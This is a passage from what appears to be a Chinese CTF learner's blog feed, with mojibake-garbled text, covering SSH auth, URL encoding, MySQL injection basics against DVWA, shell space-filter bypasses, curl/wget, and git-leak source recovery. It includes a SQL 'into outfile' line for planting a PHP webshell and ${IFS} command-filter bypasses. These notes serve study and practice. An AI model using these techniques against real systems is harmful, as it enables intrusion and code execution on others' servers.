src="/img/ssh.jpg"><br>å·¥ä½œæµç¨‹ï¼š<br>1.clientç”Ÿæˆå…¬é’¥ï¼Œç§é’¥ï¼Œå¹¶ä¸”æŠŠå…¬é’¥å­˜å‚¨åœ¨serverçš„authorized_keysæ–‡ä»¶é‡Œé¢<br>2.clientå‘é€è¿æ¥è¯·æ±‚ï¼Œå‘é€å…¬é’¥<br>3.serverå¦‚æœå‘ç°clientçš„å…¬é’¥åœ¨authorized_keysæ–‡ä»¶é‡Œé¢çš„è¯ï¼Œä¼šç”Ÿæˆä¸€æ®µéšæœºå­—ç¬¦ä¸²ç”¨å…¬é’¥åŠ å¯†å‘é€ç»™client<br>4. clientæ”¶åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²åä½¿ç”¨ç§é’¥è§£å¯†ï¼Œç„¶åæŠŠè§£å¯†åçš„å­—ç¬¦ä¸²å‘ç»™server<br>5.serveréªŒè¯å­—ç¬¦ä¸²æ˜¯å¦å’Œå‘é€çš„ç›¸ç­‰ï¼Œç›¸ç­‰çš„è¯åˆ™å»ºç«‹é“¾æ¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLç¼–ç è§£ç </title>
      <link href="2020/03/26/URL%E7%BC%96%E7%A0%81/"/>
      <url>2020/03/26/URL%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ®ç”Ÿæ—¥è®°"><a href="#æµ®ç”Ÿæ—¥è®°" class="headerlink" title="æµ®ç”Ÿæ—¥è®°"></a>æµ®ç”Ÿæ—¥è®°</h1><p>3.26 é˜´</p><h1 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h1><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/ljhabc1982/article/details/7094757">https://blog.csdn.net/ljhabc1982/article/details/7094757</a><br><a href="https://www.cnblogs.com/jerrysion/p/5522673.html">https://www.cnblogs.com/jerrysion/p/5522673.html</a><br><a href="https://www.cnblogs.com/mengff/p/7282488.html">https://www.cnblogs.com/mengff/p/7282488.html</a><br><a href="https://blog.csdn.net/danielzhou888/article/details/72861097">https://blog.csdn.net/danielzhou888/article/details/72861097</a><br>URLç¼–ç æ¦‚å¿µæçš„ä¸è°ˆã€‚<br>åªæœ‰æ•°å­—ï¼Œå¤§å°å†™å­—æ¯ï¼Œç‰¹å®šçš„ä¿ç•™å­—æ‰ä¸ä¼šè¿›è¡ŒURLç¼–ç ã€‚</p><h2 id="Understanding-of-Content-Type"><a href="#Understanding-of-Content-Type" class="headerlink" title="Understanding of Content-Type"></a>Understanding of Content-Type</h2><p>åœ¨HTTPè¯·æ±‚å’Œå“åº”æŠ•ä¸­ç”¨Content-Typeæ¥è¡¨ç¤ºå…·ä½“è¯·æ±‚ä¸­çš„åª’ä½“ç±»å‹ä¿¡æ¯ã€‚<br> å¸¸è§çš„åª’ä½“æ ¼å¼ç±»å‹å¦‚ä¸‹ï¼š</p><pre><code>text/html ï¼š HTMLæ ¼å¼text/plain ï¼šçº¯æ–‡æœ¬æ ¼å¼      text/xml ï¼š  XMLæ ¼å¼image/gif ï¼šgifå›¾ç‰‡æ ¼å¼    image/jpeg ï¼šjpgå›¾ç‰‡æ ¼å¼ image/pngï¼špngå›¾ç‰‡æ ¼å¼</code></pre><p>   ä»¥applicationå¼€å¤´çš„åª’ä½“æ ¼å¼ç±»å‹ï¼š</p><p>   application/xhtml+xml ï¼šXHTMLæ ¼å¼<br>   application/xml     ï¼š XMLæ•°æ®æ ¼å¼<br>   application/atom+xml  ï¼šAtom XMLèšåˆæ ¼å¼<br>   application/json    ï¼š JSONæ•°æ®æ ¼å¼<br>   application/pdf       ï¼špdfæ ¼å¼<br>   application/msword  ï¼š Wordæ–‡æ¡£æ ¼å¼<br>   application/octet-stream ï¼š äºŒè¿›åˆ¶æµæ•°æ®ï¼ˆå¦‚å¸¸è§çš„æ–‡ä»¶ä¸‹è½½ï¼‰<br>   application/x-www-form-urlencoded ï¼š <form encType=â€â€>ä¸­é»˜è®¤çš„encTypeï¼Œformè¡¨å•æ•°æ®è¢«ç¼–ç ä¸ºkey/valueæ ¼å¼å‘é€åˆ°æœåŠ¡å™¨ï¼ˆè¡¨å•é»˜è®¤çš„æäº¤æ•°æ®çš„æ ¼å¼ï¼‰<br>   multipart/form-data ï¼š éœ€è¦åœ¨è¡¨å•ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨è¯¥æ ¼å¼</p><h2 id="get-post-of-form"><a href="#get-post-of-form" class="headerlink" title="get/post of form"></a>get/post of form</h2><p>å¦‚æœenctypeä¸ºé»˜è®¤çš„application/x-www-form-urlencodedæ—¶ï¼š<br>formçš„methodä¸ºgetæ—¶è¯ï¼Œåˆ™æŠŠå‚æ•°æŒ‰ç…§?k1=v1&amp;k2=v2çš„å½¢å¼æ‹¼æ¥åˆ°URLçš„åé¢ç›´æ¥è®¿é—®ã€‚<br>firnçš„methodä¸ºpostçš„è¯ï¼Œåˆ™æŠŠå‚æ•°æ”¾ä»¥k1=v1&amp;k2=v2çš„å½¢å¼åˆ°è¯·æ±‚ä½“é‡Œé¢ã€‚<br>åœ¨æœ‰ input type=file æ—¶å€™ï¼Œè¦ç”¨multipart/form-dataç¼–ç æ–¹å¼ã€‚æµè§ˆå™¨ä¼šæŠŠè¡¨å•ä»¥æ§ä»¶ä¸ºå•ä½åˆ†å‰²ï¼Œæ¯ä¸ªéƒ¨åˆ†ä½¿ç”¨ â€“boundary åˆ†å‰²å¼€æ¥ï¼Œæœ€åä¸€è¡Œä½¿ç”¨ â€“boundaryâ€“ ç»“å°¾ï¼Œ<br>å¹¶ä¸”ä¸ºæ¯ä¸ªéƒ¨åˆ†åŠ ä¸ŠContent-Dispositon(form-dataæˆ–file)ã€Content-Type(é»˜è®¤text/plain)ã€<br>name(æ§ä»¶name)ç­‰ä¿¡æ¯ï¼Œå¹¶åŠ ä¸Šåˆ†å‰²ç¬¦(boundary)ã€‚<br>ä¸¾ä¾‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡formè¡¨å•æäº¤æ–‡ä»¶æ“ä½œå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot;action=&quot;http://w.sohu.com/t2/upload.do&quot; enctype=â€multipart/form-dataâ€&gt;</span><br><span class="line"></span><br><span class="line">         &lt;inputtype=&quot;text&quot; name=&quot;desc&quot;&gt;</span><br><span class="line"></span><br><span class="line">         &lt;inputtype=&quot;file&quot; name=&quot;pic&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">æµè§ˆå™¨å°†ä¼šå‘é€ä»¥ä¸‹æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/t2/upload.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>SOHUWapRebot</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-cn,zh;q=0.5</span><br><span class="line"></span><br><span class="line"><span class="attribute">Accept-Charset</span><span class="punctuation">: </span>GBK,utf-8;q=0.7,*;q=0.7</span><br><span class="line"></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60408</span><br><span class="line"></span><br><span class="line">Content-Type:multipart/form-data; boundary=ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>w.sohu.com</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data;name=&quot;desc&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>8bit</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[......][......][......][......]...........................</span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data;name=&quot;pic&quot;; filename=&quot;photo.jpg&quot;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>binary</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[å›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®]</span><br><span class="line"></span><br><span class="line">--ZnGpDtePMx0KrHh_G0X99Yef9r8JZsRJSXC--</span><br></pre></td></tr></table></figure><h2 id="å¯¹URLç¼–ç çš„ç†è§£ï¼š"><a href="#å¯¹URLç¼–ç çš„ç†è§£ï¼š" class="headerlink" title="å¯¹URLç¼–ç çš„ç†è§£ï¼š"></a>å¯¹URLç¼–ç çš„ç†è§£ï¼š</h2><p>åœ¨æµè§ˆå™¨å‘é€è¯·æ±‚å‰ï¼Œå¦‚æœå‘ç°ä¼ å…¥çš„å‚æ•°åŒ…æ‹¬äº†é™¤ä¿ç•™å­—å’Œéä¿ç•™å­—ä¹‹å¤–çš„å­—ç¬¦ï¼Œåˆ™éœ€è¦è¿›è¡ŒURLç¼–ç ï¼Œç„¶åè¿›è¡Œä¼ è¾“ã€‚<br>æœåŠ¡å™¨æ¥å—åˆ°è¯·æ±‚åä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡è§£ç è¿‡ç¨‹ã€‚<br>å³ï¼šå®¢æˆ·ç«¯å‘é€è¯·æ±‚å‰ç¡®ä¿URLç¬¦åˆè§„èŒƒï¼›å¦åˆ™è¿›è¡ŒURLç¼–ç ï¼›-&gt;ä¼ é€åˆ°æœåŠ¡ç«¯é»˜è®¤è¿›è¡Œä¸€æ¬¡URLè§£ç ï¼›ç„¶åæœåŠ¡å™¨ç«¯è¿›è¡Œä¸€æ¬¡URLç¼–ç åå‘é€ç»™å®¢æˆ·ç«¯-&gt;å®¢æˆ·ç«¯è¿›è¡ŒURLè§£ç å¹¶æ˜¾ç¤ºã€‚<br>é‚£ä¹ˆé—®é¢˜æ¥äº†ã€‚å¦‚æœæˆ‘çš„è¯·æ±‚å‚æ•°ä¸­å­˜åœ¨ç‰¹æ®Šç¬¦å·ï¼Œé‚£ä¹ˆç¼–ç åˆæ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿ<br>æ¯”å¦‚param1=admin+1<br>å¦‚æœè¿™æ ·ç›´æ¥æäº¤è¯·æ±‚çš„è¯ï¼Œæµè§ˆå™¨æ£€æŸ¥é€šè¿‡ï¼Œç›´æ¥å‘é€ï¼ˆå› ä¸º+æ˜¯ä¿ç•™å­—ï¼Œè¢«ç¿»è¯‘æˆç©ºæ ¼ï¼‰<br>åœ¨bingæœç´¢123%123 å…¶å®æœå‡ºæ¥çš„æ˜¯123 123<br><img src="/img/url3.jpg"><br>ä¸‹å›¾æ˜¯è¾“å…¥ç¼–ç åçš„æ•°æ®%2bçš„æƒ…å†µï¼š<br><img src="/img/url1.jpg"><br>ä¸‹å›¾æ˜¯ç›´æ¥è¾“å…¥+çš„æƒ…å†µ<br><img src="/img/url2.jpg"></p><h2 id="ä¿ç•™å­—ç¬¦ä¸ç”¨äºURIåˆ†éš”ç¬¦ï¼Œè€Œæ˜¯ç”¨äºå…¶å®ƒä½ç½®ï¼Œæ¯”å¦‚å‚æ•°çš„valueæ—¶ï¼Œè¦å¯¹è¿™æ—¶ç”¨åˆ°çš„ä¿ç•™å­—ç¬¦åšURLç¼–ç ã€‚"><a href="#ä¿ç•™å­—ç¬¦ä¸ç”¨äºURIåˆ†éš”ç¬¦ï¼Œè€Œæ˜¯ç”¨äºå…¶å®ƒä½ç½®ï¼Œæ¯”å¦‚å‚æ•°çš„valueæ—¶ï¼Œè¦å¯¹è¿™æ—¶ç”¨åˆ°çš„ä¿ç•™å­—ç¬¦åšURLç¼–ç ã€‚" class="headerlink" title="ä¿ç•™å­—ç¬¦ä¸ç”¨äºURIåˆ†éš”ç¬¦ï¼Œè€Œæ˜¯ç”¨äºå…¶å®ƒä½ç½®ï¼Œæ¯”å¦‚å‚æ•°çš„valueæ—¶ï¼Œè¦å¯¹è¿™æ—¶ç”¨åˆ°çš„ä¿ç•™å­—ç¬¦åšURLç¼–ç ã€‚"></a>ä¿ç•™å­—ç¬¦ä¸ç”¨äºURIåˆ†éš”ç¬¦ï¼Œè€Œæ˜¯ç”¨äºå…¶å®ƒä½ç½®ï¼Œæ¯”å¦‚å‚æ•°çš„valueæ—¶ï¼Œè¦å¯¹è¿™æ—¶ç”¨åˆ°çš„ä¿ç•™å­—ç¬¦åšURLç¼–ç ã€‚</h2><p>æ¯”å¦‚pa1=admin&amp;pa3 , pa2=123123<br>å¦‚æœä¸å¯¹valueä¸­çš„ä¿ç•™å­—è¿›è¡Œç¼–ç çš„è¯ï¼Œåˆ™ç»“æœæ˜¯è¿™æ ·çš„ï¼špa1=admin&amp;pa3&amp;pa2=123123<br>å¯èƒ½å­˜åœ¨å®‰å…¨éšæ‚£ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysqlæ³¨å…¥åŸºç¡€&amp;LinuxåŸºç¡€</title>
      <link href="2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>2020/03/26/mysql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="è‡´æ•¬"><a href="#è‡´æ•¬" class="headerlink" title="è‡´æ•¬"></a>è‡´æ•¬</h1><p><a href="https://www.freebuf.com/column/201364.html">https://www.freebuf.com/column/201364.html</a></p><h2 id="basic-stucture-of-mysql-database"><a href="#basic-stucture-of-mysql-database" class="headerlink" title="basic stucture of mysql database"></a>basic stucture of mysql database</h2><p>mysql5å†…ç½®ç³»ç»Ÿæ•°æ®åº“IFORMATION_SCHEMAï¼Œè®°å½•äº†æ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ®åº“åã€æ•°æ®åº“è¡¨åã€æ•°æ®åº“è¡¨å­—æ®µåã€‚<br>å…¶ä¸­çš„å…³é”®è¡¨ï¼š<br>SCHEMATAï¼Œå­˜å‚¨æ•°æ®åº“åï¼Œå…³é”®å­—æ®µï¼šSCHEMA_NAME -&gt;æ•°æ®åº“åç§°<br>ä¾‹å¥:<br>select schema_name from INFORMATION_SCHEMA.SCHEMATA;</p><p>åˆ™æŸ¥è¯¢åˆ°çš„æ˜¯å½“å‰æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€‚<br>tables:å­˜å‚¨è¡¨å<br>å…³é”®å­—æ®µï¼šTABLE_SCHEMA -&gt;è¡¨ç¤ºè¯¥è¡¨åå±äºå“ªä¸ªæ•°æ®åº“å<br>å…³é”®å­—æ®µï¼šTABLE_NAME -&gt;å­˜å‚¨è¡¨çš„è¡¨å<br>ä¾‹å¥</p><p>select table_name from INFORMATION_SCHEMA.tables ; //æŸ¥è¯¢æ‰€æœ‰çš„è¡¨å<br>select table_name from INFORMATION_SCHEMA.tables where table_schema=â€™dvwaâ€™; //æŸ¥è¯¢dvwaæ•°æ®åº“çš„è¡¨å<br>columns:å­˜å‚¨åˆ—å<br>å…³é”®å­—æ®µï¼šTABLE_SCHEMA -&gt;è¯¥å­—æ®µæ‰€å±æ•°æ®åº“å</p><p>å…³é”®å­—æ®µï¼šTABLE_NAME -&gt;å­˜å‚¨æ‰€å±è¡¨çš„åç§°</p><p>å…³é”®å­—æ®µï¼šCOLUMN_NAME -&gt;è¯¥å­—æ®µçš„åç§°<br>ä¾‹å¥ï¼š</p><p>select column_name from INFORMATION_SCHEMA.columns where table_name=â€™usersâ€™ and table_schema=â€™dvwaâ€™;//æŸ¥æ‰¾dvwaæ•°æ®åº“ä¸­userè¡¨ä¸­æ‰€æœ‰å­—æ®µ<br>å¸¸ç”¨å˜é‡<br>Select database() æ•°æ®åº“åç§°<br>Select VERSION() æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯<br>Select @@VERSION æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯<br>Select @@GLOBAL.VERSION æ•°æ®åº“ç‰ˆæœ¬ä¿¡<br>user() ç³»ç»Ÿç”¨æˆ·å’Œç™»å½•ä¸»æœºå<br>current_user() å½“å‰ç™»å½•ç”¨æˆ·å’Œç™»å½•ä¸»æœºå<br>system_user() æ•°æ®åº“ç³»ç»Ÿç”¨æˆ·è´¦æˆ·åç§°å’Œç™»å½•ä¸»æœºå<br>session_user() å½“å‰ä¼šè¯ç”¨æˆ·åå’Œç™»å½•ä¸»æœºå</p><p>å†™ä¸€å¥è¯<br>select â€˜â€™intooutfile â€˜/var/www/html/dvwa/1.phpâ€™; //å¯¼å‡ºä¸€å¥è¯æœ¨é©¬</p><p>åˆ¤æ–­åˆ—æ•°<br>order by n<br>å¦‚æœorder by næŠ¥é”™å¹¶ä¸”order by n-1è¿”å›ç»“æœï¼Œåˆ™åˆ—æ•°ä¸ºn-1</p><h2 id="linuxå‘½ä»¤"><a href="#linuxå‘½ä»¤" class="headerlink" title="linuxå‘½ä»¤"></a>linuxå‘½ä»¤</h2><p>find(å¾…è¡¥å……)<br>find / -name â€˜flaâ€˜ æŸ¥æ‰¾æ‰€æœ‰åŒ…å«flaçš„æ–‡ä»¶<br>find / -name flag æŸ¥æ‰¾æ‰€æœ‰ä»¥flagå‘½åçš„æ–‡ä»¶<br>-inameé€‰é¡¹ä¸åŒºåˆ†å¤§å°å†™</p><h2 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h2><p>cat flag.txt<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt</p><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><p>ls -l åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚æƒé™ å¤§å° æ‰€æœ‰è€…å’Œæ‰€å±ç»„ï¼Œä¿®æ”¹æ—¶é—´ç­‰<br>ls -all / ll æ˜¾ç¤ºéšè—æ–‡ä»¶ã€åˆ—å‡ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚æƒé™ å¤§å° æ‰€æœ‰è€…å’Œæ‰€å±ç»„ï¼Œä¿®æ”¹æ—¶é—´ç­‰<br>-rwxrw-râ€-1 root root 1213 Feb 2 09:39 abc<br>ç¬¬ä¸€ä¸ª-ä»£è¡¨æ–‡ä»¶ï¼Œdä»£è¡¨ç›®å½•,lä»£è¡¨é“¾æ¥ã€‚<br>r è¯» wå†™ xæ‰§è¡Œ<br>ä¸‰æ®µåˆ†åˆ«å¯¹åº”ç”¨æˆ·ã€ç»„ã€å…¶ä»–çš„æƒé™ã€‚ root root åˆ†åˆ«è¡¨ç¤ºç”¨æˆ·ã€ç”¨æˆ·æ‰€åœ¨çš„ç»„</p><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>chmod u/g/o +/-/= r/w/x filename<br>chmod u+x 1.txt å½“å‰userå¯æ‰§è¡Œ1.txt<br>chmod 755 1.txt å¯¹åº”æƒé™ï¼šrwxr-xr-x</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wget&amp;curl</title>
      <link href="2020/03/23/wget-curl/"/>
      <url>2020/03/23/wget-curl/</url>
      
        <content type="html"><![CDATA[<h2 id="è‡´æ•¬"><a href="#è‡´æ•¬" class="headerlink" title="è‡´æ•¬"></a>è‡´æ•¬</h2><p><a href="https://www.cnblogs.com/duhuo/p/5695256.html">https://www.cnblogs.com/duhuo/p/5695256.html</a></p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h3 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><h4 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h4><p>curl <a href="http://www.baidu.com/">www.baidu.com</a> ï¼ˆé»˜è®¤getæ–¹å¼è®¿é—®<a href="http://www.baidu.com/">www.baidu.com</a> å¹¶ä¸”å°†htmlä»£ç å›æ˜¾ï¼‰<br>curl <a href="http://www.baidu.com/">www.baidu.com</a> &gt;&gt; baidu.html ä¿å­˜ä¸ºbaidu.html<br>curl -o 2.jpg <a href="http://www.baidu.com/1.jpg">www.baidu.com/1.jpg</a> ä¸‹è½½1.jpgå¹¶ä¿å­˜ä¸º2.jpg</p><h4 id="ftpä¸‹è½½ï¼š"><a href="#ftpä¸‹è½½ï¼š" class="headerlink" title="ftpä¸‹è½½ï¼š"></a>ftpä¸‹è½½ï¼š</h4><p>curl -o -u username:password <a href="ftp://www.baidu.com/">ftp://www.baidu.com</a></p><h4 id="ftpä¸Šä¼ "><a href="#ftpä¸Šä¼ " class="headerlink" title="ftpä¸Šä¼ "></a>ftpä¸Šä¼ </h4><p>curl -T todo.jpg -u username:password <a href="ftp://www.baidu.com/">ftp://www.baidu.com</a></p><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>wgetå‘½ä»¤ç”¨æ¥ä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶ã€‚wgetéå¸¸ç¨³å®šï¼Œå®ƒåœ¨å¸¦å®½å¾ˆçª„çš„æƒ…å†µä¸‹å’Œä¸ç¨³å®šç½‘ç»œä¸­æœ‰å¾ˆå¼ºçš„é€‚åº”æ€§ï¼Œå¦‚æœæ˜¯ç”±äºç½‘ç»œçš„åŸå› ä¸‹è½½å¤±è´¥ï¼Œwgetä¼šä¸æ–­çš„å°è¯•ï¼Œç›´åˆ°æ•´ä¸ªæ–‡ä»¶ä¸‹è½½å®Œæ¯•ã€‚å¦‚æœæ˜¯æœåŠ¡å™¨æ‰“æ–­ä¸‹è½½è¿‡ç¨‹ï¼Œå®ƒä¼šå†æ¬¡è”åˆ°æœåŠ¡å™¨ä¸Šä»åœæ­¢çš„åœ°æ–¹ç»§ç»­ä¸‹è½½ã€‚è¿™å¯¹ä»é‚£äº›é™å®šäº†é“¾æ¥æ—¶é—´çš„æœåŠ¡å™¨ä¸Šä¸‹è½½å¤§æ–‡ä»¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="åŸºæœ¬ç”¨æ³•-1"><a href="#åŸºæœ¬ç”¨æ³•-1" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>wget -i filelist.txt ä¼šä¸‹è½½filelist.txté‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ã€‚<br>wget -c <a href="http://www.baidu.com/iso.iso">www.baidu.com/iso.iso</a> æ”¯æŒæ–­ç‚¹ç»­ä¼ <br>wget -r -np <a href="http://www.baidu.com/pack/">www.baidu.com/pack/</a>  npè¡¨ç¤ºä¸éå†çˆ¶ç›®å½•ï¼Œndè¡¨ç¤ºä¸åœ¨æœ¬æœºé‡æ–°åˆ›å»ºç›®å½•ç»“æ„<br>wget  -O filename <a href="http://www.baidu.com/1.php">www.baidu.com/1.php</a> å°†æ–‡ä»¶å‘½åä¸ºfilenameå¹¶ä¿å­˜</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitå¿«é€Ÿå…¥é—¨&amp;&amp;gitæ³„éœ²</title>
      <link href="2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/"/>
      <url>2020/03/20/git%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8-git%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="gitå­¦ä¹ é“¾æ¥"><a href="#gitå­¦ä¹ é“¾æ¥" class="headerlink" title="gitå­¦ä¹ é“¾æ¥:"></a>gitå­¦ä¹ é“¾æ¥:</h2><p><a href="https://learngitbranching.js.org/">https://learngitbranching.js.org/</a><br><a href="https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.html">https://bingohuang.gitbooks.io/progit2/content/10-git-internals/sections/objects.html</a><br><a href="https://zhuanlan.zhihu.com/p/44741777">https://zhuanlan.zhihu.com/p/44741777</a></p><h2 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h2><p>åŸç†ï¼šé€šè¿‡.gitæ–‡ä»¶å¤¹ä»¥åŠå­ç›®å½•ã€æ–‡ä»¶å¯ä»¥è¿˜åŸå·¥ç¨‹æºä»£ç ã€‚<br>è¿‡ç¨‹ï¼š<br>1.è§£æ.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹æ‰€æœ‰ï¼šï¼ˆæ–‡ä»¶åï¼Œæ–‡ä»¶sha1ï¼‰<br>2.å».git/objects/æ–‡ä»¶å¤¹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶<br>3.zlibè§£å‹æ–‡ä»¶ï¼ŒæŒ‰åŸå§‹çš„ç›®å½•ç»“æ„å†™å…¥æºä»£ç <br>åˆ©ç”¨å·¥å…·ï¼šGitHack</p><h3 id="åˆ©ç”¨åœºæ™¯"><a href="#åˆ©ç”¨åœºæ™¯" class="headerlink" title="åˆ©ç”¨åœºæ™¯"></a>åˆ©ç”¨åœºæ™¯</h3><p>git stash æš‚å­˜å½“å‰æ²¡æœ‰å®Œæˆçš„å·¥ä½œï¼Œå½“å¤„ç†å®Œbugåå¯ä»¥é€šè¿‡ git stash pop å°†ä¹‹å‰æ²¡åšå®Œçš„å·¥ä½œåˆå¹¶è¿‡æ¥ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡ git stash pop å¼¹å‡ºä¹‹å‰å°šæœªæäº¤çš„æ–‡ä»¶<br>git reset â€“hard HEADï½1 (æˆ–æ˜¯ç‰ˆæœ¬å·)æ„ä¸ºå°†ç‰ˆæœ¬åº“å›é€€1ä¸ªç‰ˆæœ¬ï¼Œä½†æ˜¯ä¸ä»…ä»…æ˜¯å°†æœ¬åœ°ç‰ˆæœ¬åº“çš„å¤´æŒ‡é’ˆå…¨éƒ¨é‡ç½®åˆ°æŒ‡å®šç‰ˆæœ¬ï¼Œä¹Ÿä¼šé‡ç½®æš‚å­˜åŒºï¼Œå¹¶ä¸”ä¼šå°†å·¥ä½œåŒºä»£ç ä¹Ÿå›é€€åˆ°è¿™ä¸ªç‰ˆæœ¬<br>git diff hash å¯¹æ¯”å½“å‰ç‰ˆæœ¬ä¸hashç‰ˆæœ¬æäº¤çš„åŒºåˆ«ã€‚<br>git checkout hash åˆ‡æ¢åˆ°hashç‰ˆæœ¬çš„æäº¤ä¸­ã€‚/åˆ‡æ¢åˆ†æ”¯<br>git branch -a //show all branches</p><h3 id="é’ˆå¯¹ç»ƒä¹ "><a href="#é’ˆå¯¹ç»ƒä¹ " class="headerlink" title="é’ˆå¯¹ç»ƒä¹ "></a>é’ˆå¯¹ç»ƒä¹ </h3><p>ç»ƒä¹ å¹³å°ï¼šCTFHUB <a href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a><br>æŠ€èƒ½æ ‘-web-ä¿¡æ¯æ³„éœ²-git</p>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
